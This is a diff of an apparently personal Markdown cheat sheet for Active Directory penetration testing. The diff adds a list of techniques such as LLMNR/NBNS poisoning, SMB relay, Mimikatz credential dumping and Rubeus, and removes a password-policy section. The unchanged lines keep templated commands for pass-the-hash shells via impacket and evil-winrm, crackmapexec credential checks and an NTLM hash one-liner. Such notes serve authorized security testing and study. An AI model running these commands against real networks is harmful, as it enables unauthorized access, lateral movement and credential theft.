@@ -1,7 +1,15 @@
 # AD Info
 Passwords in SYSVOL also known as GPP Passwords
-LLMNR Spoofing
-
+LLMNR/NBNS Poisoning
+	`Reponder`
+SMB Relay attack
+Passwords in user description
+IPv6 DNS Takeover Attacks
+Token Impersonation
+Credential Dumping with Mimikatz
+Weaponized LNK
+local & remote Rubeus
+local powershell
 
 AD
 	ADUC
@@ -81,10 +89,6 @@ import hashlib,binascii
 print(binascii.hexlify(hashlib.new('md4', "<PASSWORD>".encode('utf-16le')).digest()))
 ```
 
-## Password policy
-`polenum '<USER>':'<PASS>' -d <IP/DOMAIN>`
-`crackmapexec smb IP -u '<USER>' -p '<PASS>' --pass-pol`
-
 ## Expoitation
 Check:
 `crackmapexec SERVICE <IP> -u '<USER>' -p <PASS>` hash: -H
@@ -93,6 +97,7 @@ Shell:
 `impacket-wmiexec -hashes '<HASH>' <USER>@<IP>`
 `impacket-psexec -hashes '<HASH>' <USER>@<IP>`
 `evil-winrm -i <IP> -u <USER> -p '<PASS>'` hash: -H
+
 ## Post-exploitation
 `Bloodhound`
 	`SharpHound` for local AD
